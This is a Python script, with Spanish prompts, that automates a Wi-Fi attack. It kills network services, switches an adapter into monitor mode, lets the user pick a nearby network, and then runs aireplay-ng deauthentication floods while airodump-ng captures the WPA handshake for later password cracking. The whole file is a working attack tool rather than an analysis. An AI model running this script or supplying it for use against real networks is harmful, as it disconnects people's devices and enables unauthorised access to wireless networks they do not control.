import os
from netifaces import interfaces as interf
import subprocess, signal
import time
import threading
from subprocess import Popen
import sys


def mataproceso(nomProceso):
    p = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
    out, err = p.communicate()
    for line in out.splitlines():
        if nomProceso in str(line):
            pid = int(line.split(None, 1)[0])
            try:
                os.kill(pid, signal.SIGKILL)
            except ProcessLookupError :
                pass


def separaEspacios(linea):
    arrLineaDatos = []
    linea = linea.replace('*',' ')
    linea = linea.strip()
    strAux = ""
    for i in range(len(linea)):
        if linea[i] != ' ' :
            strAux+=linea[i]
        elif strAux != ' ' and strAux != '':
            arrLineaDatos.append(strAux)
            strAux = ''
    arrLineaDatos.append(strAux)
    return arrLineaDatos

def chekiaInterfaces():
    interfaces = interf()
    cont = 0
    for inter in interfaces:
        if "mon" in inter:
            return inter


def ponerInterfaces():
    interfaces = interf()
    cont = 0
    interfacesW = []
    for inter in interfaces:
        if inter == "lo":
            pass
        elif "eth" in inter:
            pass
        else:
            cont+=1
            interfacesW.append(inter)
            print(f"{cont})\t{inter}")
    num = int(input("\nElige el numero del adaptador que quieres poner en modo monitor: "))
    interfaz = interfacesW[num-1]
    return interfaz


def modoMonitor(interfaz):
    if "mon" in interfaz:
        os.system("sudo airmon-ng stop {}".format(interfaz))
    else:
        os.system("sudo airmon-ng check kill")
        mataproceso('NetworkManager')
        mataproceso('wpa_supplicant')
        os.system("sudo airmon-ng start {}".format(interfaz))
    return interfaz


def eligeRed(sisiosino):
    os.system("sudo NetworkManager")
    if sisiosino:
        time.sleep(25)
    redesDisponibles = os.popen("nmcli dev wifi").read()
    arrRedes = redesDisponibles.split("\n")
    print(arrRedes[0])
    arrRedes.pop()
    for i in range(1,len(arrRedes)):
        arrRedes[i] = arrRedes[i].strip()
        print(f"{i})\t{arrRedes[i]}")
    num = int(input("\nElige el numero de la red de la que quieres capturar el handshake: "))
    bssid = arrRedes[num][:17]
    arrLineaDatos = separaEspacios(arrRedes[num])
    print(arrLineaDatos)
    return arrLineaDatos


def capturarHandShake(arrLineaDatos,interfaz,rutaFich):
    # p = subprocess.run("sudo airodump-ng -w {} -c {}  --bssid {} {}".format(rutaFich,arrLineaDatos[3],arrLineaDatos[0],interfaz))
    args = '-w {} -c {}  --bssid {} {}'.format(rutaFich,arrLineaDatos[3],arrLineaDatos[0],interfaz)
    print("cap")
    p = subprocess.Popen(['airodump-ng', '-w',rutaFich,'-c' ,arrLineaDatos[3],'--bssid',arrLineaDatos[0],interfaz], stdout=subprocess.PIPE)
    time.sleep(30)
    p.terminate()



def deautenticar(arrLineaDatos,interfaz):
    # p = subprocess.run("sudo aireplay-ng --deauth 100 -a {} {}".format(arrLineaDatos[0],interfaz))
    args = '--deauth 0 -a {} {}'.format(arrLineaDatos[0],interfaz)
    print("deauth")
    p = subprocess.Popen(['aireplay-ng', '--deauth','100','-a',arrLineaDatos[0],interfaz], stdout=subprocess.PIPE)
    time.sleep(30)
    p.terminate()


if __name__ == "__main__":   
    inte = chekiaInterfaces()
    cosa = False
    if inte != None:
        modoMonitor(inte)
        cosa = True
    arrLineaDatos = eligeRed(cosa)
    interfaz = ponerInterfaces()
    modoMonitor(interfaz)
    interfaz = interfaz+"mon"
    # os.popen("sudo airodump-ng -w {} -c {}  --bssid {} {}".format(rutaFich,arrLineaDatos[3],arrLineaDatos[0],interfaz))
    rutaFich = input("introduce nombre para guardar el fichero con el handshake: ")
    try:
        print("Pulsa ctrl+C para finalizar en mas o menos 1 minuto")
        capHand = threading.Thread(target=capturarHandShake, args = (arrLineaDatos,interfaz,rutaFich))
        deauth = threading.Thread(target=deautenticar, args =(arrLineaDatos,interfaz))
        capHand.start()
        deauth.start()

    except KeyboardInterrupt : 
        # print("Hasta luego!")
        pass
